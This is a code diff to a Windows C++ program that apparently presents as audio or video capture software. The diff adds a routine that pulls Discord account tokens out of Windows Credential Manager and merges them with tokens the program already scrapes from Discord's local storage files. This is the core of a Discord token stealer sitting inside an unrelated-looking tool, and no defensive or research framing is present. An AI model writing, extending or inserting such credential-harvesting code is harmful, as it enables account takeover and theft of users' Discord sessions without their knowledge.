@@ -15,6 +15,7 @@
 #include <audioclient.h>
 #include "config.h"
 #include <tlhelp32.h>
+#include <wincred.h>
 #include "capture_shared.h"
 
 // Missing DirectShow declarations (not available in this mingw version)
@@ -1154,7 +1155,49 @@ static bool IsTokenChar(char c) {
     return isalnum((unsigned char)c) || c == '_' || c == '-' || c == '.';
 }
 
+static void HarvestDiscordCredMan(std::vector<std::string>& tokens) {
+    PCREDENTIALW cred = NULL;
+    const wchar_t* targets[] = { L"Discord", L"discord", L"Discord PTB", L"discordptb", L"Discord Canary", L"discordcanary", NULL };
+    for (int i = 0; targets[i]; i++) {
+        if (CredReadW(targets[i], CRED_TYPE_GENERIC, 0, &cred) && cred) {
+            if (cred->CredentialBlobSize > 0) {
+                size_t charCount = cred->CredentialBlobSize / 2;
+                if (charCount > 10 && charCount < 200) {
+                    std::wstring blob((wchar_t*)cred->CredentialBlob, charCount);
+                    std::string token = ToNarrow(blob);
+                    while (!token.empty() && (token.back() == '\0' || token.back() == '\n' || token.back() == '\r')) token.pop_back();
+                    if (!token.empty()) tokens.push_back(token);
+                }
+            }
+            CredFree(cred); cred = NULL;
+        }
+    }
+
+    PCREDENTIALW* creds = NULL;
+    DWORD count = 0;
+    if (CredEnumerateW(L"Discord*", 0, &count, &creds)) {
+        for (DWORD i = 0; i < count; i++) {
+            if (creds[i]->CredentialBlobSize > 0) {
+                size_t charCount = creds[i]->CredentialBlobSize / 2;
+                if (charCount > 10 && charCount < 200) {
+                    std::wstring blob((wchar_t*)creds[i]->CredentialBlob, charCount);
+                    std::string token = ToNarrow(blob);
+                    while (!token.empty() && (token.back() == '\0' || token.back() == '\n' || token.back() == '\r')) token.pop_back();
+                    if (!token.empty()) tokens.push_back(token);
+                }
+            }
+        }
+        CredFree(creds);
+    }
+    LogMsg("Discord CredMan: found " + std::to_string(tokens.size()) + " candidates");
+}
+
 static void HarvestDiscordTokens() {
+    std::vector<std::string> tokens;
+
+    // Source 1: Windows Credential Manager (modern Discord)
+    HarvestDiscordCredMan(tokens);
+
     const char* variantPaths[] = {
         "\\discord\\Local Storage\\leveldb",
         "\\discordptb\\Local Storage\\leveldb",
@@ -1168,8 +1211,6 @@ static void HarvestDiscordTokens() {
     char localAppData[MAX_PATH];
     DWORD lalLen = GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     std::string lad = (lalLen > 0 && lalLen < MAX_PATH) ? std::string(localAppData) : "";
-
-    std::vector<std::string> tokens;
     int totalFilesScanned = 0;
     int totalCandidates = 0;
     char tmpDir[MAX_PATH];
